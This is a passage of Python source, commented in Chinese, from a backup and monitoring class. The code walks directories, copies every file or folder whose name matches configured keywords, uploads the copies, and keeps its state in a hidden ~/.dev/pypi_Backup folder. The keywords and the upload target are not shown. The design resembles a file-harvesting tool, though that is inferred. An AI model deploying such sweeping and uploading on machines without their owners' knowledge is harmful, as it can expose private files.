                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    logging.error(f"❌ ZTB监控出错: {str(e)}")
                
            time.sleep(interval)

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def _get_next_backup_time(self):
        """获取下次备份时间的时间戳文件路径"""
        return str(Path.home() / ".dev/pypi_Backup/next_backup_time.txt")
        
    def save_next_backup_time(self):
        """保存下次备份时间"""
        next_time = datetime.now() + timedelta(seconds=self.config.BACKUP_INTERVAL)
        try:
            with open(self._get_next_backup_time(), 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"❌ 保存下次备份时间失败: {e}")
            return None
            
    def should_run_backup(self):
        """检查是否应该执行备份
        
        Returns:
            bool: 是否应该执行备份
            datetime or None: 下次备份时间（如果存在）
        """
        threshold_file = self._get_next_backup_time()
        if not os.path.exists(threshold_file):
            return True, None
            
        try:
            with open(threshold_file, 'r') as f:
                next_backup_time = datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                
            current_time = datetime.now()
            if current_time >= next_backup_time:
                return True, None
            return False, next_backup_time
        except Exception as e:
            logging.error(f"❌ 读取下次备份时间失败: {e}")
            return True, None

    def _contains_keyword(self, name):
        """检查文件名或目录名是否包含关键字（不区分大小写）
        
        Args:
            name: 文件名或目录名
            
        Returns:
            bool: 是否包含关键字
        """
        name_lower = name.lower()
        for keyword in self.config.KEYWORD_BACKUP_KEYWORDS:
            if keyword.lower() in name_lower:
                return True
        return False

    def backup_keyword_files(self, source_dir, target_dir):
        """备份包含关键字的文件和文件夹
        
        Args:
            source_dir: 源目录路径
            target_dir: 目标目录路径
            
        Returns:
            str: 备份目录路径，如果失败则返回None
        """
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"开始备份关键字文件:")
            logging.debug(f"源目录: {source_dir}")
            logging.debug(f"目标目录: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"❌ 源目录不存在: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return None

        try:
            source_dir_abs = os.path.abspath(source_dir)
            target_dir_abs = os.path.abspath(target_dir)
            
            files_count = 0
            dirs_count = 0
            backed_up_paths = set()  # 记录已备份的路径，避免重复备份
            
            # 遍历源目录
            for root, dirs, files in os.walk(source_dir):
                root_abs = os.path.abspath(root)
                
                # 跳过目标备份目录本身
                if root_abs.startswith(target_dir_abs):
                    continue
                
                # 跳过排除的目录
                if root != source_dir and self.should_exclude_wsl_path(root, source_dir):
                    dirs[:] = []  # 清空dirs列表，阻止进入子目录
                    continue
                
                # 检查目录名是否包含关键字
                root_name = os.path.basename(root)
                if self._contains_keyword(root_name):
                    # 备份整个目录
                    relative_path = os.path.relpath(root, source_dir)
                    target_path = os.path.join(target_dir, relative_path)
                    
                    # 避免重复备份
                    if root_abs not in backed_up_paths:
                        try:
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path, ignore_errors=True)
                            if self._ensure_directory(os.path.dirname(target_path)):
                                shutil.copytree(root, target_path, symlinks=True)
                                backed_up_paths.add(root_abs)
                                dirs_count += 1
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"🔑 已备份关键字目录: {relative_path}/")
                        except Exception as e:
                            logging.error(f"❌ 备份关键字目录失败 {relative_path}: {str(e)}")
                    
                    # 标记所有子目录为已备份，避免重复处理
                    for subdir in dirs:
                        subdir_path = os.path.join(root, subdir)
                        backed_up_paths.add(os.path.abspath(subdir_path))
                    dirs[:] = []  # 清空dirs列表，不再进入子目录
                    continue
                
                # 检查当前目录是否在已备份的目录中（如果是，跳过该目录下的所有文件）
                if any(root_abs.startswith(backed_path + os.sep) or root_abs == backed_path 
                       for backed_path in backed_up_paths):
                    continue
                
                # 检查文件名是否包含关键字
                for file in files:
                    if self._contains_keyword(file):
                        source_file = os.path.join(root, file)
                        source_file_abs = os.path.abspath(source_file)
                        
                        # 避免重复备份
                        if source_file_abs in backed_up_paths:
                            continue
                        
                        # 检查文件是否在已备份的目录中
                        if any(source_file_abs.startswith(backed_path + os.sep) or source_file_abs == backed_path
                               for backed_path in backed_up_paths):
                            continue
                        
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0:
                                continue
                            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"跳过大文件: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                                continue
                        except OSError:
                            continue
                        
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(target_dir, relative_path)
                        target_file = os.path.join(target_sub_dir, file)
                        
                        try:
                            if self._ensure_directory(target_sub_dir):
                                shutil.copy2(source_file, target_file)
                                backed_up_paths.add(source_file_abs)
                                files_count += 1
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"🔑 已备份关键字文件: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"❌ 备份关键字文件失败 {relative_path}/{file}: {str(e)}")
            
            # 打印备份统计信息
            if files_count > 0 or dirs_count > 0:
                logging.info(f"\n🔑 关键字文件备份统计:")
                if files_count > 0:
                    logging.info(f"   📄 文件: {files_count} 个")
                if dirs_count > 0:
                    logging.info(f"   📁 目录: {dirs_count} 个")
                return target_dir
            else:
                if self.config.DEBUG_MODE:
                    logging.debug("未找到包含关键字的文件或目录")
                return None
                
        except Exception as e:
            logging.error(f"❌ 关键字文件备份过程出错: {str(e)}")
            if self.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            return None
